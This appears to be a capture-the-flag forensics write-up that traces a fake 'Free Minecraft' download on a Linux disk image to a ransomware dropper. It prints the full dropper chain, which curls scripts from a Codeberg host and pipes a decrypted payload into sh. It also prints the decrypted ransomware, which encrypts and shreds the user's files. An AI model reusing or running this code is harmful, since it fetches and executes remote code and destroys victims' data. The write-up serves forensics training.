# Free Minecraft

<details>
  
  <summary> <b> Description </b> </summary>

- **Category**: `Forensics`

- **Author**: `Devobass`
    
- **Tools**: `FTK Imager`, `DB Browser SQLite`

</details>

> [!NOTE]
> Disk forensics of entertainment-themed phising with shell script-based symmetric encryption-driven ransomware

We are presented with `disk.img.xz` and `hash.txt`. Let's first analyse the disk image with FTK Imager.

*File > Add Evidence Item > Image File > Next > Browse the source path > Finish*

Upon wandering around in the `home` folder, I found some sussy stuff:

<img width="959" height="562" alt="image" src="https://github.com/user-attachments/assets/293ef349-163e-4bfc-adae-1a163f7b7285" />

Right-click the text and modify the encoding to UTF-8: 

`Ваши файлы зашифрованы, для расшифровки отправьте $36000 на 12345678910 TCB`

Which is translated into:

`Your files are encrypted; to decrypt them, send $36,000 to 12345678910 TCB`. 

Wandering around for more, there is a symlink called `minecrap` containing `/tmp/downloader.sh`

<img width="959" height="562" alt="image" src="https://github.com/user-attachments/assets/34272f18-ade6-4c8f-8487-abde40440f59" />

From these two file, we can infer that our `cool_user` is infected with ransomware while attempting to crack the game Minecraft and downloading from untrusted source from the Internet.

I suppose we would like to trace back the downloader. Unfortunately, `/tmp` is empty, since it is self-destructive. But we can look up the user's browser history to retrieve what was lost. We can see that the user is using the browser Mozilla Firefox. After doing some research on the whereabouts of Firefox history on Linux, I found:

<img width="959" height="560" alt="image" src="https://github.com/user-attachments/assets/32fe6bf7-7524-4b7b-96da-8bcb55af3b6e" />

<img width="957" height="473" alt="image" src="https://github.com/user-attachments/assets/11601440-14eb-41fc-a2e9-765e8726cde9" />

All roads lead to `places.sqlite`.

<img width="959" height="563" alt="image" src="https://github.com/user-attachments/assets/04897196-8226-4a78-b383-353791749a53" />

Export this file, and then we need a SQLite Browser to read this file. Go to File > Open Database > Choose the file > Browse Data. Wandering around different tables to view them, and the one with the name `moz.places` reveals more sussy stuff:

<img width="958" height="564" alt="image" src="https://github.com/user-attachments/assets/d2b8d0ed-fc1c-4f7e-ab06-a64a11b9947a" />

We have a website, a query on how to download "Free Minecraft", and a youtube link that record the installment of the user. Apparently, this user has followed the guide to download the fake game and paste the shell script into his terminal. 

> [!TIP]
> This type of malware is also known as [dropper](https://en.wikipedia.org/wiki/Dropper_(malware)).

<img width="959" height="533" alt="image" src="https://github.com/user-attachments/assets/9d2cf437-faa5-4f92-8aca-a9f053f870d8" />

Following the Codeberg link (`https://codeberg.org/evil-guy-on-the-internet/pages`), a platform similar to Github, we are presented with four smaller shell script files that construct the malware.

<img width="959" height="565" alt="image" src="https://github.com/user-attachments/assets/65996ad4-fe87-4e8b-9ebf-2901ab3a5878" />

Let's analyse the malware in details:

- `download-minecrap.sh`
```
#!/usr/bin/env sh

printf "Hang tight while were downloading minecrap for you!\n"
curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/downloader.sh" --output "/tmp/downloader.sh"
chmod 777 "/tmp/downloader.sh"
ln -s "/tmp/downloader.sh" "$HOME/minecrap"
sleep 2
printf "done!\n"
```

This displays friendly download text, fetches `downloader.sh` into `/tmp`, makes it executable, and creates a shortcut at `~/minecrap`.

- `downloader.sh`
```
#!/usr/bin/env sh

export AES_KEY="nowsyourchancetobeabigshot"

curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/decrypter.sh" --output "/tmp/decrypter.sh" 
sh "/tmp/decrypter.sh" &

printf "Downlaoding libraries...\n"
sleep 2

printf "Downlaoding jutjutsu kaisen mod apk unlimited money...\n"
sleep 2

printf "Downlaoding shaders with no lag 2019...\n"
sleep 2

printf "Downlaoding minecrap.exe from mahjong...\n"
sleep 2

printf "404 FILE NOT FOUND\n"
sleep 1

printf "Sorry your Minecrap is not available right naow, plaese try agian later."
```

It sets `AES_KEY` to `howsyourchancetobeabigshot`. This `AES_KEY` is going to be used again in the symmetric encryption phase.

It also downloads and runs `decrypter.sh` in the background. While the payload is already running, it prints fake status messages with timed pauses, and ends with `404 FILE NOT FOUND` and claims the program is unavailable, helping conceal what happened.

- `decrypter.sh`
```
#!/usr/bin/env sh

SEED="$(printf $AES_KEY | sha256sum)"
KEY="$(printf $SEED | cut -c 1-32)"
IV="$(printf $SEED | cut -c 33-64)"

SEED_R="$(printf "$USER-$(hostname)" | sha256sum)"
export KEY_R="$(printf $SEED_R | cut -c 1-32)"
export IV_R="$(printf $SEED_R | cut -c 33-64)"

curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/ransom.sh" | xxd -r -p | openssl enc -d -aes-128-cbc -K "$KEY" -iv "$IV" | sh > /dev/null 2>&1

printf 'Ваши файлы зашифрованы, для расшифровки отправьте $36000 на 12345678910 TCB' > "ransom_note_$USER.txt"
```

This is the ransomware loader.

First, it takes an existing secret in $AES_KEY (in the `downloader.sh`), hashes it with SHA-256 for the SEED, and splits the hexadecimal hash into two parts KEY and IV
- KEY: first 16 bytes for AES-128
- IV: last 16-byte initialization vector

Moreover, it builds another value from the current username and hostname, exporting KEY_R and IV_R. The downloaded payload may use these to identify the victim or encrypt data uniquely per machine.

Then, it silently downloads `ransom.sh` from Codeberg, treats it as hex-encoded data, converts it back to bytes, decrypts it using AES-128-CBC, and pipes the resulting plaintext directly into the shell for execution. The pipeline can be briefed as `curl --> xxd --> openssl decrypt --> sh`. This mean that the actual malicious logic is hidden remotely and encrypted until execution. The author can also change that remote payload at their disposal.

Finally, silences all output/errors of the installment of the ransomware with `> /dev/null 2>&1` to conceal the malicious intent and then creates a ransom-note file named like `ransom_note_<username>.txt`.

> [!NOTE]
> `/dev/null`: This is a special virtual file often called the data black hole. Anything written to it is instantly discarded by the system.
> 
> `>`: This is the redirection operator for "stdout", redirecting the normal text output of the command to a designated destination - in this case, `/dev/null`.
> 
> `2>&1`: This redirects "stderr" to the same destination as "stdout". `2` represents the file descriptor for stderr (error messages). `>` is the redirect operator. `&1` is the pointer to the file descriptor for stdout (rather than creating a literal file named "1"). Therefore, the error will also follow the output to `/dev/null`.

- `ransom.sh`
```
823e674b58b8dd29cd35848d171e6fd54ae471c9409c4173858112a8575b4d8ca6ab32ed96f95fe7f5a532f6f2f41b9c5ecd466026d9ce51e3f60ff4107522fb04a6ff8bd464acfe487b2b9dec310d2975cdcaba1fdf71efa945162ea0c6021744c385f3388eb94234c07fca7437787dd9ebf91f9074e13d7b3a526ac2c53dcf1d95f9292990dd3f49d13b3126162e629ad740204c3fd90b468d851a216683a210130534c6bf9744fae78fee3b75c83c562712d58dcfc7051dcc38e1a702c2dbe7434911a9229b1778e6935d6bbacab428103be2fa4a8c056eb83251245a5d6fa2be2af2defa3bba0e921ff7fac6b04c5ea116b858186387bf4b1151db014e7918fa3bb400d7c182f994fc7d3020000029f70bc97d99986f22feb6754e1ad172818b8fa34f7a6cacfcc4bca9f090a69a086b36c0436b4c751bc4ede0f87ada77f5ff5a3b90bb291fbbf87ca400fc3d0af2facc1ee435bfd31593b36a21e7de4477772dee3a9ff933966cbc52a1dd2f696a0e6a37249da613411ce8417f3a4dc1fea753464d46c0cb268ff992b6d716819b306b345402a482ccbd63c4ab5232851dfb668d630ff70d95300357e47f5614b2f3d5b9c4239359773f1129cf5850dad53373db300bde5cdf9407ca453894fe33b296c6b7188301d76ccfcf1b320cd7c482bf74e8b606aabd9b3485494bc82b65e926a8cb183d5be72f086a392585907751b2979f7cdaa2ec91f51bc06cbe8249accd930174a5271b21a870be349a3a59b729572d53dd40db6bcf5f92a6622d7aa391734cf246ced5e72c71e71ab953cdca3ec942a256f21be095834432975498b6015cbdc3f19439238ca001e0ad4d27b1f6b42920a19f4db0f1c994cc03e670d2d83e83dbc8b2bf304b6bd17696111c7ffa401607cccc6b488a4f64032b4e9ff944a18342486c43f7fe86e909da32
```

This is our malware, encrypted with AES. To understand how it really works, we need to decipher it first using the logic above.

We are provided with:

`AES_KEY = "nowsyourchancetobeabigshot"`

Compute the SHA256 of this value to get `SEED`:

`SEED = 486fd2365fa54a6884f4e8dc363d01584e221c81c4123e2021105b19cede1319`

Then splits the 64 hexadecimal characters into two parts: KEY and IV

- Key = Character 1 to 32 = `486fd2365fa54a6884f4e8dc363d0158` (AES-128)
- IV = Character 33 to 64 = `4e221c81c4123e2021105b19cede1319` (CBC)

Configurate the input as HEX and the output as RAW.

<img width="959" height="449" alt="image" src="https://github.com/user-attachments/assets/3fed0304-d5b5-4e8c-975f-16f529fe3bee" />

We can now retrieve our ransomware shell script:

```
#!/usr/bin/env sh

fail() {
	echo "There is no free minecrap"
	exit
}

if grep -qE '^(flags|Features).*hypervisor' /proc/cpuinfo 2>/dev/null; then
	:
else
	# 2. DMI vendor / product name
	for f in \
		/sys/class/dmi/id/sys_vendor \
		/sys/class/dmi/id/product_name \
		/sys/class/dmi/id/board_vendor
	do
		[ -r "$f" ] || continue
		case "$(cat "$f")" in
			*QEMU*|*KVM*|*VMware*|*VirtualBox*|*Xen*|*Microsoft*)
				exit 0
				;;
		esac
	done
	fail
fi

find . -path '*/.*' -prune -o ! -name '*.naoyacrypted' -type f -print | while IFS= read -r i; do
	openssl aes-128-cbc -e -in "$i" -K "$KEY_R" -iv "$IV_R" | xxd -p > "$i.naoyacrypted"
	shred -zu "$i"
done
```
